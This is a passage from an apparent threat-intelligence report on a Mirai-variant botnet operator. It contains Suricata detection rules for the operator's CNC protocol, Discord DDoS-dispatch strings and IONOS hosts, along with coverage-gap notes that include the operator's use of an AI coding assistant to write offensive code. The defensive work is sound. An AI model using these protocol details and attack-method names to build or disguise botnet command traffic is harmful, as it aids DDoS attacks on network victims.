**Rationale:** The operator-bespoke Mirai protocol modification (option keys as length-prefixed STRINGS vs stock single-byte enum values) defeats standard Mirai-protocol IDS rules. This Suricata rule targets the operator-specific CNC command protocol byte pattern on TCP/23 connections to `165.227.175.161` — specifically the key_length byte followed by ASCII string rather than the standard 1-byte enum at that offset. Defenders using stock Mirai IDS rules will miss this variant.
**ATT&CK Coverage:** T1095 (Non-Application Layer Protocol), T1027 (Obfuscated Files or Information)
**Confidence:** HIGH — protocol modification confirmed via ARM ELF disassembly of CNC option-parsing code
**False Positive Risk:** LOW — pattern is specific to TCP/23 CNC traffic to the operator's host; no legitimate application uses this protocol structure to this destination

```suricata
# Rule 5 — Mirai operator-bespoke protocol: length-prefixed string option keys
# Stock Mirai option key field at CNC command offset is a single byte (0x00-0xFF enum).
# Naku variant uses a length byte followed by a string — this produces a distinctive
# pattern where the option block starts with a non-zero length byte followed by
# printable ASCII chars rather than a single control-byte enum value.
# Detection: TCP/23 flow to CNC IP carrying 4-byte duration + 1-byte method + target table
# + option block starting with length-prefixed string (heuristic: byte > 0x01 followed by ASCII)
alert tcp $HOME_NET any -> 165.227.175.161 23 (msg:"THL - Naku-Pandora Mirai Operator-Bespoke CNC Protocol (Length-Prefixed String Option Keys) - Defeats Stock Mirai IDS Rules - UTA-2026-014"; flow:to_server,established; dsize:>8; content:"|00 00|"; depth:2; offset:0; pcre:"/^.{4}.[\x01-\x14][A-Za-z0-9_]/"; sid:9001010; rev:1; metadata:affected_product Linux_IoT, attack_target IoT_Device, created_at 2026_05_26, deployment Perimeter, signature_severity High, tag UTA-2026-014;)
```

---

**Detection Priority:** MEDIUM
**Rationale:** Discord API egress from server hosts carrying DDoS-method dispatch strings in the request body (detectable via plain-text Discord API channels or proxy inspection). The Matrix C2 Discord bot routes customer attack requests through discord.com/api/v9/ with method names like `ovh-nuke`, `syn-storm`, `frag-storm`. Detection requires TLS inspection or proxy log analysis.
**ATT&CK Coverage:** T1059.007 (JavaScript), T1498.001 (Direct Network Flood)
**Confidence:** MODERATE — requires TLS inspection or proxy log capability
**False Positive Risk:** MEDIUM — Discord API traffic is common; requires content inspection to confirm attack-method dispatch

```suricata
# Rule 6 — Discord API egress from server hosts with attack-method dispatch pattern
# Requires SSL/TLS inspection or HTTP proxy (not applicable to raw encrypted Discord HTTPS)
# Most useful with proxy/DPI capability or in environments where the Discord bot uses
# non-HTTPS webhook endpoints (unusual but possible in dev/test deployments)
alert http $HOME_NET any -> any any (msg:"THL - Matrix C2 Discord Bot Attack-Method Dispatch - DDoS-as-a-Service Customer Interface - UTA-2026-014"; http.host; content:"discord.com"; http.request_body; content:"ovh-nuke"; nocase; sid:9001011; rev:1; metadata:affected_product Discord, attack_target Network, created_at 2026_05_26, deployment Internal, signature_severity High, tag UTA-2026-014;)

alert http $HOME_NET any -> any any (msg:"THL - Matrix C2 Discord Bot Attack-Method Dispatch syn-storm/frag-storm - UTA-2026-014"; http.host; content:"discord.com"; http.request_body; pcre:"/(?:syn-storm|frag-storm|udp-bypass|icmp-hell)/i"; sid:9001012; rev:1; metadata:affected_product Discord, attack_target Network, created_at 2026_05_26, deployment Internal, signature_severity High, tag UTA-2026-014;)
```

---

**Detection Priority:** MEDIUM
**Rationale:** JARM/JA4X fingerprint matching for `87.106.143.220` catches the operator's IONOS infrastructure across port/service migrations. JARM fingerprints are infrastructure-level signatures that persist even when services rotate ports or content. Deployment requires JARM-capable network sensor (Zeek + JARM script, or JA4 sensor).
**ATT&CK Coverage:** T1583.003 (Acquire Infrastructure: VPS), T1584.004 (Compromise Infrastructure: Server)
**Confidence:** MODERATE — JARM fingerprint may change with TLS library updates on the host; provides hunting pivot rather than high-confidence block
**False Positive Risk:** LOW for the specific JARM hash; MEDIUM if IONOS uses shared TLS termination across customers (possible cluster false positives)

```suricata
# Rule 7 — JARM/JA4X fingerprint for operator IONOS host 87.106.143.220
# JARM fingerprint observed at investigation time; may drift with TLS library updates.
# Deploy as hunting/pivot rule rather than blocking rule.
# Note: Suricata does not natively match JARM hashes; this requires integration with
# Zeek JARM script or JA4+ sensor producing JARM metadata as flow metadata.
# The SID is reserved; actual JARM matching should be implemented via threat intel feeds.
# For native Suricata, match on destination IP + TLS port as a network-layer pivot.
alert tls $HOME_NET any -> 87.106.143.220 any (msg:"THL - TLS Connection to Rovodev Operator IONOS VPS 87.106.143.220 - Pivot on Operator Infrastructure - UTA-2026-014"; flow:to_server; sid:9001013; rev:1; metadata:affected_product Linux_Server, attack_target Network, created_at 2026_05_26, deployment Perimeter, signature_severity Medium, tag UTA-2026-014;)

alert tls $HOME_NET any -> 87.106.54.213 any (msg:"THL - TLS Connection to Rovodev Operator IONOS Backup VPS 87.106.54.213 - Pivot on Operator Infrastructure - UTA-2026-014"; flow:to_server; sid:9001014; rev:1; metadata:affected_product Linux_Server, attack_target Network, created_at 2026_05_26, deployment Perimeter, signature_severity Medium, tag UTA-2026-014;)
```

---

## Coverage Gaps

### github.com/keyosbuff/C2-Leak — Deleted Upstream Source Gap

**Technique:** T1588.001 (Obtain Capabilities: Malware)
**Gap:** The operator's declared upstream Mirai code source (`github.com/keyosbuff/C2-Leak`) is now 404/deleted as of Phase 15 §22. Without access to that repository, a direct code-diff comparison between the upstream source and the operator's Naku variant cannot be performed. This prevents characterization of all operator-bespoke modifications beyond what was discovered independently via binary analysis (triple XOR keys, double Huawei scanner, 22-char charset, string-length-prefixed option keys, `.anime` marker). Evidence that would close this gap: GitHub archive scrape capturing the repo before deletion, a cached copy in GitHub Archive, or a second operator referencing the same repository.
**Current coverage:** PARTIAL — operator-bespoke modifications documented via binary analysis; upstream scope unknown.

---

### Matrix C2 Python Protocol — No Public Reference for Comparison

**Technique:** T1095 (Non-Application Layer Protocol)
**Gap:** The Matrix C2 JSON-over-TCP protocol (`87.106.143.220:1337`) has no documented reference implementation to compare against. The operator built this protocol from scratch (AI-co-authored) and no prior public operator has used this exact schema (`bot_register` + `heartbeat` with `bot_type`/`arch`/`vendor` JSON fields). Deeper behavioral analysis (packet captures from live botnet operation) would enable more precise protocol-layer detection signatures. Evidence that would enable higher-confidence Suricata content rules: passive capture of actual C2 sessions from a compromised victim host.
**Current coverage:** LOW — IP/port-level detection only; no deep packet inspection rules for the JSON payload.

---

### Pandora 11-Arch IoT Evolution — No Prior Public Documentation

**Technique:** T1190 (Exploit Public-Facing Application), T1588.001 (Obtain Capabilities: Malware)
**Gap:** Prior public documentation of the Pandora-Mirai family (Doctor Web September 2023) covers only the Android-TV scope. The 11-architecture IoT extension documented in this investigation is first public characterization. No comparative corpus exists for prior-art YARA rules targeting the IoT-extended variant family. This means detection coverage relies entirely on operator-bespoke indicators found in this investigation; if a second downstream operator adopts the IoT-extended codebase with different naming/charset conventions, coverage will degrade.
**Current coverage:** HIGH for this specific operator's build; MODERATE for the broader Pandora-Mirai IoT-extended family class.

---

### Parasitic-CNC-on-Legit-VPS OPSEC Pattern — No Mirai-Family Literature Precedent

**Technique:** T1584.004 (Compromise Infrastructure: Server)
**Gap:** The operator's use of a compromised legitimate tourism VPS (`165.227.175.161` / GetYourGroup GmbH) specifically for Naku CNC, while reserving operator-owned IONOS infrastructure for the higher-value Matrix C2 customer service, is a documented-here split-channel OPSEC pattern with no Mirai-family literature precedent found in Tier 1–3 sources. Without a known pattern signature, behavioral detection of this OPSEC strategy requires network telemetry showing a CNC on a host with co-located legitimate web traffic — which standard IDS setups do not surface. Evidence that would enable class-level detection: longitudinal study of Mirai CNC infrastructure across multiple threat actors to characterize parasitic-CNC adoption rates.
**Current coverage:** LOW (network-level detection only via known IPs; no class-level behavioral detection).

---

### Rovodev Session JSON Detection — Requires Atlassian-Side Telemetry

**Technique:** T1587.001 (Develop Capabilities: Malware)
**Gap:** Full detection of the operator's AI co-authoring workflow requires access to Atlassian Rovodev server-side telemetry (session logs, file_write tool call auditing, abuse detection). The on-disk artifacts detected by YARA rules 8 and Sigma rule 9 are only visible when the operator makes an OPSEC error (exposing the session JSON via open directory). In a non-exposed deployment, the operator's use of Rovodev for offensive code authoring is invisible to standard SOC tooling. Closing this gap requires Atlassian Trust & Safety partnership for detection at the platform level, not the endpoint level.
**Current coverage:** LOW — endpoint artifact detection only (requires operator OPSEC failure); zero coverage of in-progress Rovodev offensive sessions.

---

### Discord Operator Account — Vendor Channel Required for Termination

**Technique:** T1583.003 (Acquire Infrastructure: VPS), T1059.007 (JavaScript)
**Gap:** The Discord operator account snowflake (`1441591352927326259`, created 2025-11-22) is detected via YARA rule 10 (artifact exposure). However, Discord account termination and bot takedown requires direct coordination with Discord Trust & Safety — there is no standard SOC workflow for this. The snowflake-decode methodology (timestamp extraction from Discord ID, freshness signal calculation) is documented and reproducible but the ops-account termination action is out of standard SOC scope. Evidence required for Discord T&S: the captured `whatineed.txt` prompt (direct DDoS-for-hire solicitation), the Discord bot's attack-dispatch JavaScript table (direct evidence of DDoS service customer interface), and the operator ID snowflake for account lookup.
**Current coverage:** DETECTION HIGH (YARA rule 10); REMEDIATION OUT OF SCOPE (requires vendor channel).

---

### Mirai Handshake Detection — Suricata Rule 5 Protocol Heuristic

**Technique:** T1095 (Non-Application Layer Protocol)
**Gap:** The Suricata Rule 5 (operator-bespoke Mirai protocol pattern) uses a PCRE heuristic on the CNC command stream. Without ground-truth packet captures from active Naku bot sessions, the PCRE cannot be validated against real traffic. The regex pattern (`/^.{4}.[\x01-\x14][A-Za-z0-9_]/`) is derived from the disassembled parsing logic but may require tuning after live traffic validation. Deploy with threshold or alert-only before promoting to block.
**Current coverage:** MODERATE — heuristic only; requires live traffic validation.

---

## License

Detection rules are licensed under **Creative Commons Attribution-NonCommercial 4.0 International (CC BY-NC 4.0)**.
Free to use in your environment, but not for commercial purposes.

